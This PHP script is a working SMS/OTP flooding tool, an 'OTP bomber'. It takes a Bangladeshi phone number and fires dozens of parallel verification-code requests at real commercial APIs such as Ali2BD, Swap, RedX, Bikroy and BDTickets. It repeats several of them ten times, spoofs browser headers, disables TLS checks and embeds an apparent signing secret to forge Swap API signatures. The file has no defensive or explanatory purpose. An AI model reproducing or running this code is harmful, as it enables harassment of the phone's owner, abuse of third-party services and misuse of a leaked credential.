<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); 
set_time_limit(0); 

$phone = $_GET['phone'] ?? '';

// ১. ফোন নাম্বার ভ্যালিডেশন
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

// ফোন ফরমেটিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;

$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    
$phone_fundesh = substr($phone_11, 1);    

$api_requests = [];

// ==========================================
// 🛠️ FIXED: Ali2BD (আপনার দেওয়া স্পেশাল হেডারসহ)
// ==========================================
$api_requests[] = [
    "name" => "ali2bd_1",
    "url" => "https://edge.ali2bd.com/api/consumer/v1/auth/login",
    "method" => "POST",
    "data" => ["username" => $phone_plus88],
    "headers" => [
        'Content-Type: application/json',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
        'Origin: https://ali2bd.com',
        'Referer: https://ali2bd.com/'
    ]
];

// ==========================================
// 🛠️ FIXED: Swap (Deepto Style +880 Format)
// ==========================================
$swap_secret = "UFNyP1f+s2bjwVAFbOBv87a142orsWLt7X/4M7pMVyE="; 
$swap_timestamp = (string) time(); 
$swap_signature = base64_encode(hash_hmac('sha256', $deepto_number . $swap_timestamp, $swap_secret, true));

$api_requests[] = [
    "name" => "swap_1",
    "url" => "https://api.swap.com.bd/api/v1/send-otp/v2",
    "method" => "POST",
    "data" => ["phone" => $deepto_number, "timestamp" => (int)$swap_timestamp],
    "headers" => [
        'Content-Type: application/json',
        'signature: ' . $swap_signature,
        'Origin: https://swap.com.bd',
        'Referer: https://swap.com.bd/'
    ]
];

// ==========================================
// 🛠️ FIXED: PBS (Strict Headers)
// ==========================================
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "pbs_$i",
        "url" => "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
        "method" => "POST",
        "data" => ["userPhone" => $phone_11],
        "headers" => [
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F)',
            'Origin: https://pbs.com.bd',
            'Referer: https://pbs.com.bd/'
        ]
    ];
}

// ==========================================
// 🛠️ FIXED: Hishabee (URL & Body Fix)
// ==========================================
$api_requests[] = [
    "name" => "hishabee_1",
    "url" => "https://app.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88",
    "method" => "POST",
    "data" => [],
    "headers" => [
        'platform: WEB',
        'origin: https://web.hishabee.business',
        'referer: https://web.hishabee.business/',
        'content-length: 0'
    ]
];

// ==========================================
// 🟢 OTHERS: বাকি সব সার্ভিস (Untouched)
// ==========================================

// ShadhinMusic (১০ বার)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"shadhin_$i","url"=>"https://connect.shadhinmusic.com/v1/api//otp/send","method"=>"POST","data"=>["msisdn"=>$phone_88],"headers"=>['Content-Type:application/json','Origin:https://shadhinmusic.com']];
// RedX (১০ বার)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"redx_$i","url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://redx.com.bd']];
// Bikroy (১০ বার)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bikroy_$i","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET"];
// BDTickets (১০ বার)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://api.bdtickets.com:20100/v1/auth","method"=>"POST","data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],"headers"=>['Content-Type:application/json']];
// Garibook & others (১ বার করে)
$api_requests[] = ["name"=>"osudpotro_1","url"=>"https://api.osudpotro.com/api/v1/users/send_otp","method"=>"POST","data"=>["mobile"=>$phone_osudpotro,"deviceToken"=>"web","language"=>"en","os"=>"web"],"headers"=>['Content-Type:application/json']];
$api_requests[] = ["name"=>"apex4u_1","url"=>"https://api.apex4u.com/api/auth/login","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json']];
$api_requests[] = ["name"=>"fundesh_1","url"=>"https://fundesh.com.bd/api/auth/generateOTP?service_key=","method"=>"POST","data"=>["msisdn"=>$phone_fundesh],"headers"=>['Content-Type:application/json']];

// ==========================================
// ⚡ Parallel Execution (Multi-cURL)
// ==========================================
$mh = curl_multi_init();
$handles = [];

foreach($api_requests as $key => $api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    
    $headers = $api['headers'] ?? [];
    // ডিফল্ট ইউজার এজেন্ট যদি হেডার-এ না থাকে
    if (!in_array('User-Agent', array_column(array_map(fn($h) => explode(':', $h), $headers), 0))) {
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if(isset($api['method']) && $api['method'] === "GET"){
        curl_setopt($ch, CURLOPT_POST, false);
    } else {
        curl_setopt($ch, CURLOPT_POST, true);
        $postData = (isset($api['data']) && !empty($api['data'])) ? json_encode($api['data']) : "";
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    }

    $handles[$key] = $ch;
    curl_multi_add_handle($mh, $ch);
}

$running = null;
do {
    $status = curl_multi_exec($mh, $running);
    if ($running) curl_multi_select($mh);
} while ($running > 0 && $status == CURLM_OK);

$final_results = [];
foreach($handles as $key => $ch){
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $final_results[$api_requests[$key]['name']] = ["code" => $code];
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

echo json_encode(["status" => "success", "data" => $final_results], JSON_PRETTY_PRINT);
?>
